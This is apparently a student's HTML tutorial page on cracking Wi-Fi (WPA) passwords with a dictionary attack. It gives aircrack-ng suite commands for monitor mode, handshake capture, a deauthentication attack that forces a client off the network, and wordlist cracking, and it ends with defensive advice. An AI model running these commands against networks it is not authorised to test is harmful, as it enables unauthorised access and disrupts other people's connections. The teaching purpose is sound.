@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Decoding Wi-fi Password</title>
+</head>
+
+<body>
+    <header>
+        <h1>Shivam | Decoding Wi-fi Password using Dictionary Attack</h1>
+        <nav>
+            <span>
+                <a href="#home">Home</a> <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
+                <a href="#Introduction">Introduction</a> <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
+                <a href="#Overview">Overview</a>
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
+                <a href="#Tools Overview">Tools Overview</a>
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
+                <a href="#Workflow">Workflow</a>
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
+                <a href="#Conclusion">Conclusion</a>
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
+                <a href="#About">About</a>
+            </span>
+        </nav>
+    </header>
+    <hr>
+    <main>
+        <section id="Introduction">
+            <div>
+                <h2>Introduction</h2>
+            </div>
+            <p> Ever wondered how hackers crack passwords so easily and why it is recommended to have a long, complex
+                password?
+            </p>
+            <p>
+                Movies often show hackers cracking passwords in seconds, but in real life, the process is little bit complicated. There are many ways to crack passwords but today we are going to learn a technique called <a href="https://en.wikipedia.org/wiki/Dictionary_attack" target="_blank">
+
+                    <strong>Dictionary Attack</strong> 
+                </a>
+                with demonstrating it by cracking a wifi password.
+            </p>
+
+        </section>
+        <section id="Overview">
+            <h2>Dictionary Attack Overview</h2>
+            <p>
+                Wi-Fi password testing can happen offline after the required connection information has been captured.
+                This allows password guesses to be tested without repeatedly connecting to the router.
+            </p>
+            <p>There are three main steps involved in this process:</p>
+            <ul>
+                <li>
+                    <strong>Finding Wi-Fi Networks:</strong><span>
+                        Scanning nearby networks to learn about their names and security settings.
+                    </span>
+                </li>
+                <li>
+                    <strong>Capturing Connection Information:</strong><span>
+                        Collecting information exchanged between a router and a device during connection.
+                    </span>
+                </li>
+                <li>
+                    <strong>Testing Passwords:</strong><span>
+                        Using a wordlist, a file containing possible passwords, to check for a match.
+                    </span>
+                </li>
+            </ul>
+            <p>If a password is common or easy , it may be discovered quickly. A long, unique password makes
+                this process much harder.</p>
+        </section>
+        <section id="Tools Overview">
+            <h2>Tools Used</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Tool Name</th>&nbsp;
+                        <th>Primary Function</th>
+                    </tr>
+                </thead>
+                <br>
+                <tbody>
+                    <tr>
+                        <td>airmon-ng</td>
+                        <td>Prepares a compatible Wi-Fi adapter for monitoring.</td>
+                    </tr>
+                    <tr>
+                        <td>airodump-ng</td>
+                        <td>Finds networks and captures wireless traffic.</td>
+                    </tr>
+                    <tr>
+                        <td>aireplay-ng</td>
+                        <td>Forces client reconnections to trigger handshakes.</td>
+                    </tr>
+                    <tr>
+                        <td>aircrack-ng</td>
+                        <td>Tests possible passwords against captured information.</td>
+                    </tr>
+                </tbody>
+            </table>
+            
+        </section>
+        <section id="Workflow">
+            <h2>Step-by-Step Terminal Workflow</h2>
+            <ol>
+                <li><strong>Enable Monitor Mode:</strong> Prepare a compatible Wi-Fi adapter to listen to wireless
+                    traffic using tools such as airmon-ng.</li>
+                    <br>
+                    <code>sudo airmon-ng start wlan0[Adapter Name]</code>
+                    <br>
+                    <br>
+                    <li><strong>Scan the Network: </strong>Fire up airodump-ng on wlan0mon[Adapter Name] to grab the target's BSSID and
+                        channel:</li>
+                        <br>
+                        <code>sudo airodump-ng wlan0mon[Adapter Name]</code>
+                        <br>
+                        <br>
+                        <div id="image1">
+            <img src="image1.png" alt="Terminal showing captured WPA handshake." height="250">
+        </div>
+                        <li><strong>Capture Connection Information:</strong> Lock onto the channel, then force a client to
+                            reconnect:</li><br>
+                            <code>sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w target_capture wlan0mon[Adapter Name]</code>
+                            <br>
+                            <code>sudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon[Adapter Name]</code>
+                            <br>
+                            <br>
+                            <div id="image2">
+                                <img src="image2.png" alt="Terminal running aireplay-ng deauthentication attack." height="450">
+                            </div>
+                <br>
+                <li><strong>Crack Password:</strong> Feed your capture file and wordlist into the cracker:</li>
+                <br>
+                <code>aircrack-ng -w /usr/share/wordlists/rockyou.txt target_capture-01.cap</code>
+                <br>
+            </ol>
+                <h3>Note</h3>
+                <p>Before starting the process install the aircrack-ng with the following command.</p>
+
+                <code>sudo apt install aircrack-ng</code>
+        </section>
+        <section id="Conclusion">
+            <h2>Conclusion</h2>
+            <p>Wi-Fi password testing teaches us an important lesson: <strong>
+                    having a password does not automatically make a network secure. Password strength and encryption
+                    both matter.
+                </strong>
+            </p>
+            Using a long, unique password, choosing modern security such as WPA3, and keeping router software updated
+            can help protect your network.
+            </p>
+        </section>
+    </main>
+    <hr>
+    <footer>
+        <section id="About">
+            <h2>About</h2>
+            <p>
+                <p>Name:Shivam</p>  <p>Roll No:LCI2026021</p>
+                <p>Branch: CSAI</p>
+            </p>
+        </section>
+        
+    </footer>
+</body>
+
+</html>
